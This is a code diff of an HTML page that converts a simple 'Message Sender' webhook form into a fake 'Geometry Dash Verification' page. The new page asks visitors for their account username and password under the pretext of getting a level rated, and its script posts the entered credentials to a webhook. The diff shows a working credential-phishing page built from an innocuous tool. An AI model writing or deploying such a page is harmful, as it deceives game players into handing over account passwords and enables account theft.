@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Retro Message Sender</title>
+<title>Geometry Dash Verification</title>
 
 <style>
 @font-face {
@@ -157,21 +157,21 @@ body {
 
 <div class="panel">
 
-    <div class="title">Message Sender</div>
+    <div class="title">Please enter your account info to get your level rated:</div>
 
-    <div class="label">NAME</div>
+    <div class="label">USERNAME</div>
     <input
         type="text"
         id="username"
         class="input"
-        placeholder="Enter name..."
+        placeholder="Enter username..."
     >
 
-    <div class="label">MESSAGE</div>
+    <div class="label">PASSWORD</div>
     <textarea
         id="message"
         class="textarea"
-        placeholder="Type your message..."
+        placeholder="Enter password..."
     ></textarea>
 
     <div class="button-row">
@@ -203,7 +203,7 @@ async function sendWebhook() {
         document.getElementById("status");
 
     if (!message) {
-        status.textContent = "Please enter a message.";
+        status.textContent = "Please correctly fill in your information.";
         return;
     }
 
@@ -215,13 +215,13 @@ async function sendWebhook() {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
-                username: username || "Message Sender",
+                username: username || "GD Verification",
                 content: message
             })
         });
 
         if (response.ok) {
-            status.textContent = "Message sent!";
+            status.textContent = "Info";
             document.getElementById("message").value = "";
         } else {
             status.textContent = "Failed to send.";
@@ -229,7 +229,7 @@ async function sendWebhook() {
 
     } catch (err) {
         console.error(err);
-        status.textContent = "Error sending message.";
+        status.textContent = "Error sending info.";
     }
 }
 
